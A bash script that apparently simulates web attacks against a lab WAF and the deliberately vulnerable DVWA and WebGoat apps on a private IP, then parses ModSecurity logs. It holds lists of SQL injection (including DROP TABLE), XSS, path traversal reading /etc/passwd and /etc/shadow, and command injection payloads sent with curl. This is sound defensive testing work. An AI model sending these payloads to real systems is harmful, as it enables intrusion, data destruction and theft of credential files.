#!/bin/bash
TARGET="http://192.168.25.200"
echo "🚀 Starting Attack Simulation..."

sqli=(
    "/?id=1' OR '1'='1 --"
    "/?id=1 UNION SELECT 1,2,3 --"
    "/?id=1; DROP TABLE users--"
    "/?id=1' AND SLEEP(5)--"
    "/?search=1' OR 1=1--"
    "/?user=admin'--"
    "/?id=1 AND 1=1--"
    "/?id=' OR ''='"
    "/?id=1' OR 'x'='x"
    "/?name=1' UNION SELECT null,null,null--"
    "/?id=1; SELECT * FROM users--"
    "/?pass=1' OR 1=1 LIMIT 1--"
    "/?q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
    "/?id=1 ORDER BY 10--"
    "/?id=1' GROUP BY 1--"
    "/?id=1' HAVING 1=1--"
)

xss=(
    "/?q=<script>alert(1)</script>"
    "/?q=<img src=x onerror=alert(1)>"
    "/?name=<svg onload=alert(1)>"
    "/?q=<body onload=alert('xss')>"
    "/?search=<script>document.cookie</script>"
    "/?q=javascript:alert(1)"
    "/?q=<iframe src=javascript:alert(1)>"
    "/?q=<input onfocus=alert(1) autofocus>"
)

lfi=(
    "/../../etc/passwd"
    "/../../../etc/passwd"
    "/?file=../../etc/passwd"
    "/?page=../../../etc/shadow"
    "/WEB-INF/web.xml"
    "/?file=....//....//etc/passwd"
    "/?path=../../etc/hosts"
    "/?file=/etc/passwd%00"
)

cmd=(
    "/?cmd=whoami"
    "/?exec=ls -la"
    "/?cmd=cat /etc/passwd"
    "/?q=;whoami"
    "/?id=1;ls"
    "/?cmd=id;uname -a"
)

echo "[*] SQL Injection..."
for p in "${sqli[@]}"; do curl -s -o /dev/null "$TARGET$p"; sleep 0.2; done

echo "[*] XSS..."
for p in "${xss[@]}"; do curl -s -o /dev/null "$TARGET$p"; sleep 0.2; done

echo "[*] LFI..."
for p in "${lfi[@]}"; do curl -s -o /dev/null "$TARGET$p"; sleep 0.2; done

echo "[*] Command Injection..."
for p in "${cmd[@]}"; do curl -s -o /dev/null "$TARGET$p"; sleep 0.2; done

echo "✅ Done!"


echo "Parsing logs..."
sleep 3
cd /home/amelia/SENTINEL
source waf_flask/venv/bin/activate
python3 parse_modsec.py
echo "Done!"

# Attack DVWA
echo "Attacking DVWA..."
TARGET_DVWA="http://192.168.25.200/dvwa"
for i in {1..5}; do
    curl -s -o /dev/null "${TARGET_DVWA}/vulnerabilities/sqli/?id=$i%27+OR+%271%27%3D%271+--&Submit=Submit"
    curl -s -o /dev/null "${TARGET_DVWA}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert($i)%3C%2Fscript%3E"
    curl -s -o /dev/null "${TARGET_DVWA}/vulnerabilities/fi/?page=../../etc/passwd$i"
    curl -s -o /dev/null "${TARGET_DVWA}/vulnerabilities/exec/?ip=127.0.0.1%3Bwhoami&Submit=Submit"
done

# Attack WebGoat
echo "Attacking WebGoat..."
TARGET_WEBGOAT="http://192.168.25.200/webgoat/WebGoat"
for i in {1..5}; do
    curl -s -o /dev/null "${TARGET_WEBGOAT}/?id=$i%27+OR+%271%27%3D%271+--"
    curl -s -o /dev/null "${TARGET_WEBGOAT}/?q=%3Cscript%3Ealert($i)%3C%2Fscript%3E"
    curl -s -o /dev/null "${TARGET_WEBGOAT}/?page=../../etc/passwd$i"
    curl -s -o /dev/null "${TARGET_WEBGOAT}/?cmd=whoami"
done
